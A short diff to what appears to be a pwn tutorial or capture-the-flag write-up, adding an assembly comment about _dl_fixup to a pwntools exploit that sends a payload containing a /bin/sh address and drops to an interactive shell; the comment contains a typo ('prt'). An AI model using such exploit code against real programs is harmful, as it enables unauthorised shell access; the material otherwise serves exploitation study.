@@ -289,6 +289,11 @@ payload3 = flat({
     binsh_addr,     # argument
   ]
 })
+'''
+mov   edx, dword ptr[esp+0x10]    ; edx = rel_plt_offset
+mov   eax, dword prt[esp+0xc]     ; 
+call  _dl_fixup
+'''
 io.send(payload3)
 io.interactive()
 ```
